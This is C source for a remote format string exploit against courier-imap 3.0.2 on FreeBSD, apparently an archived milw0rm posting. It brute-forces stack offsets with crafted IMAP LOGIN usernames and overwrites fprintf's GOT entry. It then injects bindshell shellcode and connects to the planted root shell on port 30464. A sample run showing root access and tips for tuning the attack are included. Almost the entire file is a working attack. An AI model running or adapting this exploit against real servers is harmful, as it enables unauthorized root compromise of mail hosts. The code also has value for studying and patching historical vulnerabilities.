/*
  courier-imap <= 3.0.2-r1 Remote Format String Vulnerability exploit
  
  Author: ktha at hush dot com
  
  Tested on FreeBSD 4.10-RELEASE with courier-imap-3.0.2
  
  Special thanks goes to andrewg for providing the FreeBSD box.
  
  Greetings: all the guys from irc pulltheplug com and irc netric org
  
  bash-2.05b$ ./sm00ny-courier_imap_fsx
  courier-imap <= 3.0.2-r1 Remote Format String Vulnerability exploit by ktha at hush dot com
  [*] Launching attack against 127.0.0.1:143
  [+] Got current ebp(5100): 0xbfbfb050
  [+] Got possible saved ebp(3281): 0xbfbfe390
  [+] Got possible write on the stack pointer(3293): 0xbfbfe3c0
  [+] Verifying...failed
  [+] Got possible saved ebp(3286): 0xbfbfe3a4
  [+] Got possible write on the stack pointer(3298): 0xbfbfe3d4
  [+] Verifying...failed
  [+] Got possible saved ebp(3287): 0xbfbfe3a8
  [+] Got possible write on the stack pointer(3299): 0xbfbfe3d8
  [+] Verifying...OK
  [+] Building fmt...done
  [+] Building shellcode...done
  [*] Using ret: 0x8057000
  [*] Using got of fprintf(): 0x804fefc
  [*] Checking for shell..
  uid=0(root) gid=0(wheel) groups=0(wheel), 2(kmem), 3(sys), 4(tty), 5(operator), 20(staff), 31(guest)
   
  N.B. 1. ret can be guessed ;)
     2. got, well.. that's a different story, it must be bruteforced
     3. "ce_number" & "se_number" can be set with some default values when running multiple times
  4. shell is usable for aprox 1 min
    
  [ Need a challenge ? ]
  [ Visit http://www.pulltheplug.com ]
  
*/

#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <string.h>
#include <errno.h>
#include <signal.h>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>

#define BIGBUF 2048

#define IMAP_PORT 143

#define END_BRUTEFORCE_STACK 5500

#define TOP_STACK 0xbfc00000 /* FreeBSD */

#define START_BRUTEFORCE_SAVED_EBP 3000

#define JUNK 9

#define GAP_EBP_ESP 48

#define DUMMY_NUMBER 100


void die(int type, char *message) {
 if(type == 2)
 perror(message);
    else
     fprintf(stderr,"%s\n",message);
 exit(1);
}

int connect_to (char *host, int port){
 struct hostent *h;
 struct sockaddr_in c;
 int sock;

 if ((host == NULL) || (*host == (char) 0))
   die(1, "[-] Invalid hostname");

 if ((c.sin_addr.s_addr = inet_addr (host)) == -1){
   if ((h = gethostbyname (host)) == NULL)
  die(1, "[-] Cannot resolve host");
   memcpy ((char *) &c.sin_addr, (char *) h->h_addr, sizeof (c.sin_addr));
 }
 if ((sock = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
   die(2,"[-] Error creating socket:");
 c.sin_family = PF_INET;
 c.sin_port = htons (port);
 if (connect (sock, (struct sockaddr *) &c, sizeof (c)) == -1)
   die(2, "[-] Cannot connect: ");
 return sock;
}

void close_socket (int sock){
 shutdown (sock, 2);
 close (sock);
}

char *get_request(char *username, char *password){
 char *request = (char *)malloc(strlen(username)+strlen(password)+20);
 sprintf(request,"1 LOGIN \"%s\" \"%s\"\r\n",username, password);
 return request;
}

void send_data(int sock, char *request){
 int n;
 n = send (sock, request, strlen (request), 0);
 if (n != strlen (request)){
        close_socket (sock);
        die(1, "Error sending request\n");
 }
}


int get_ce_number(char *host, int port){
 int sock;
 int loop;
 char temp[BIGBUF];
 int l,n;
 char username[BIGBUF];
 char password[BIGBUF];
 char *request;
 
 for (loop = END_BRUTEFORCE_STACK;;loop--){
 sock = connect_to(host, port);
 n = recv (sock, temp, sizeof (temp), 0);
 sprintf(password,"sm00ny");
 sprintf(username,"%%%d$p",loop);
 request = get_request(username,password);
 send_data(sock,request);
 memset(temp,0,sizeof(temp));
 n = recv (sock, temp, sizeof (temp), 0);
 close_socket (sock);
 if (n > 0)
  break;
 }
 return loop;
}


int get_se_number(int start, int end, char *host, int port){
 int loop;
 char username[BIGBUF];
 char password[BIGBUF];
 char *request;
 int l,n;
 char temp[BIGBUF];
 int sock;
 if (!start)
 start = START_BRUTEFORCE_SAVED_EBP;
 for (loop = start; loop < end; loop++){
 sock = connect_to(host, port);
 n = recv (sock, temp, sizeof (temp), 0);
 sprintf(password,"sm00ny");
 sprintf(username,"%%%d$n",loop);
 request = get_request(username,password);
 send_data(sock,request);
 memset(temp,0,sizeof(temp));
 n = recv (sock, temp, sizeof (temp), 0);
 close_socket (sock);
 if (n > 0)
  break;
 }
 if (loop == end)
 return -1;
 
 return loop;
}





int verify_se_number(int write, unsigned long addy, int number, char *host, int port){
    char username[BIGBUF];
    char password[BIGBUF];
    char temp[BIGBUF];
    char *request;
    int n, sock;
    
    sock = connect_to(host, port);
    memset(temp,0,sizeof(temp));
    n = recv (sock, temp, sizeof (temp), 0);
    sprintf(password,"sm00ny");
    sprintf(username,"%%%uu%%%u$hn%%%u$hn", (addy & 0xffff) - JUNK, number, write);
    request = get_request(username,password);
    send_data(sock,request);
    memset(temp,0,sizeof(temp));
    n = recv (sock, temp, sizeof (temp), 0);
    close_socket (sock);
    if (n <= 0)
     return 0;
     
    sock = connect_to(host, port);
    memset(temp,0,sizeof(temp));
    n = recv (sock, temp, sizeof (temp), 0);
    sprintf(password,"sm00ny");
    sprintf(username,"%%%u$n%%%u$hn", number, write);
    request = get_request(username,password);
    send_data(sock,request);
    memset(temp,0,sizeof(temp));
    n = recv (sock, temp, sizeof (temp), 0);
    close_socket (sock);
    if (n > 0)
     return 0;
     
    return 1;
}
                                                                            
                                                                            
int *get_format_vector(unsigned long got_addy, unsigned long got, unsigned long ret){
 int i,j,sum,byte;
 int *vec = (int *)malloc(11 * sizeof(int));
 
 sum = JUNK;
 for (i=0; i<2; i++){
 for (j=0; j<2; j++){
  vec[2*(2 * i + j)] = (got_addy & 0xffff) - sum;
  while (vec[2*(2 * i + j)] <= 12)
  vec[2*(2 * i + j)] += 0x10000;
  sum += vec[2*(2 * i + j)];
  
  byte = ((got + 2 * i) >> (16*j)) & 0xffff;
  vec[2*(2 * i + j) + 1] = byte - sum;
  while (vec[2*(2 * i + j) + 1] <= 12)
  vec[2*(2 * i + j) + 1] += 0x10000;
  sum += vec[2*(2 * i + j) + 1];
  got_addy += 2;
 }
 }
 for (i=0; i<2; i++){
 byte = (ret >> (16*i)) & 0xffff;
 vec[8+i] = byte - sum;
 while (vec[8+i] <= 12)
  vec[8+i] += 0x10000;
 sum += vec[8+i];
 }
 
 return vec;
}

char *get_format_string(int *vec, int se_number, int write_number, int got_number){
 char *buf = (char *) malloc(BIGBUF);
 char smallbuf[256];
 int i;
 
 for (i=0; i<4; i++){
 sprintf(smallbuf ,"%%%uu%%%u$hn%%%uu%%%u$hn",vec[2*i],se_number,vec[2*i+1],write_number);
 strcat(buf,smallbuf);
 }
 for (i=0; i<2; i++){
 sprintf(smallbuf,"%%%uu%%%u$hn",vec[8 + i],got_number + i);
 strcat(buf,smallbuf);
 }
 return buf;
}


char *gen_shellcode (int gap){
 int size;
 char *p;
 char shellcode[] =
 /* Thanks ilja */
 "\x31\xc0\x31\xc9\x31\xd2\xb0\x61"
 "\x51\xb1\x06\x51\xb1\x01\x51\xb1"
 "\x02\x51\x8d\x0c\x24\x51\xcd\x80"
 "\xb1\x02\x31\xc9\x51\x51\x51\x80"
 "\xc1\x77\x66\x51\xb5\x02\x66\x51"
 "\x8d\x0c\x24\xb2\x10\x52\x51\x50"
 "\x8d\x0c\x24\x51\x89\xc2\x31\xc0"
 "\xb0\x68\xcd\x80\xb3\x01\x53\x52"
 "\x8d\x0c\x24\x51\x31\xc0\xb0\x6a"
 "\xcd\x80\x31\xc0\x50\x50\x52\x8d"
 "\x0c\x24\x51\x31\xc9\xb0\x1e\xcd"
 "\x80\x89\xc3\x53\x51\x31\xc0\xb0"
 "\x5a\xcd\x80\x41\x53\x51\x31\xc0"
 "\xb0\x5a\xcd\x80\x41\x53\x51\x31"
 "\xc0\xb0\x5a\xcd\x80\x31\xdb\x53"
 "\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
 "\x62\x69\x89\xe3\x31\xc0\x50\x54"
 "\x53\x50\xb0\x3b\xcd\x80\x31\xc0"
 "\xb0\x01\xcd\x80";
                                                                         
 
    size = strlen (shellcode);
 p = (char *) malloc (gap + 1);
 
 /* Some nops ;) */
 memset (p, 0x41, gap);
 
 memcpy (p + gap - size, shellcode, size + 1);
 return p;
}


void root(char *host) {
 fd_set rfds;
    int n;
    int sock;
    char buff[1024];
    
    sock = connect_to(host,30464);
    send(sock,"id;\n",4,0);
    while(1) {
     FD_ZERO(&rfds);
     FD_SET(0, &rfds);
        FD_SET(sock, &rfds);
        if(select(sock+1, &rfds, NULL, NULL, NULL) < 1)
         exit(0);
        if(FD_ISSET(0,&rfds)) {
         if( (n = read(0,buff,sizeof(buff))) < 1)
         exit(0);
         if( send(sock,buff,n,0) != n)
         exit(0);
        }
        if(FD_ISSET(sock,&rfds)) {
         if( (n = recv(sock,buff,sizeof(buff),0)) < 1)
         exit(0);
         write(1,buff,n);
        }
 }
}



main (int argc, char **argv) {
 char *host="127.0.0.1";
 int port = IMAP_PORT;
 int sock;
 
 char *temp1, *temp2;
 char *request;
 int *vec;
 
 int n,ok,i;
 
 unsigned long cur_ebp; // was 5100 on my box
 int ce_number = 0;
 unsigned long saved_ebp; // was 3287 on my box
 int se_number = 0;
 unsigned long write_addy;
 int write_number = 0;
 unsigned long got_addy;
 int got_number = 0;
 
 /* objdump -R /usr/lib/courier-imap/sbin/imaplogin | grep fprintf */
 unsigned long got = 0x0804fefc;
 /* heh.. it's up to you to find this one :P Just use your favourite mathod */
 unsigned long ret = 0x8057000;
  
 if (argc > 1)
  host = argv[1];

 printf("courier-imap <= 3.0.2-r1 Remote Format String Vulnerability exploit by ktha at hush dot com\n");
 
 printf("[*] Launching attack against %s:%d\n",host,port);
 
 if (ce_number == 0)
  ce_number = get_ce_number(host,port);
 cur_ebp = TOP_STACK - 4 * ce_number;
 
 got_number = DUMMY_NUMBER;
 got_addy = cur_ebp + 4 * (got_number - 1);
  
 printf("[+] Got current ebp(%d): %p\n",ce_number,cur_ebp);
 
 do{
  se_number = get_se_number(se_number,ce_number,host,port);
  if (se_number == -1)
  die(1,"[-] Failed to get a saved_ebp !");
  
  saved_ebp = cur_ebp + 4 * (se_number - 1);
  printf("[+] Got possible saved ebp(%d): %p\n",se_number,saved_ebp);
  
  write_addy = GAP_EBP_ESP + saved_ebp;
  write_number = (write_addy - cur_ebp) / 4 + 1;
 printf("[+] Got possible write on the stack pointer(%d): %p\n",write_number,write_addy);
  
  printf("[+] Verifying...");
  ok = verify_se_number(write_number,got_addy,se_number,host,port);
  if (ok)
  printf("OK\n");
  else {
  printf("failed\n");
  se_number++;
  }
 }while (!ok);
 
 printf("[+] Building fmt...");
 vec = get_format_vector(got_addy,got,ret);
 temp1 = get_format_string(vec,se_number,write_number,got_number);
 printf("done\n");
 
 printf("[+] Building shellcode...");
 temp2 = gen_shellcode(800);
 printf("done\n");
 
 printf("[*] Using ret: %p\n",ret);
 printf("[*] Using got of fprintf(): %p\n",got);
 
 request = get_request(temp1,temp2);
 
 sock = connect_to(host, port);
 send_data(sock,request);
 sleep(2);
 close_socket (sock);
 
 printf("[*] Checking for shell..\n");
 root(host);
}

// milw0rm.com [2004-09-02]
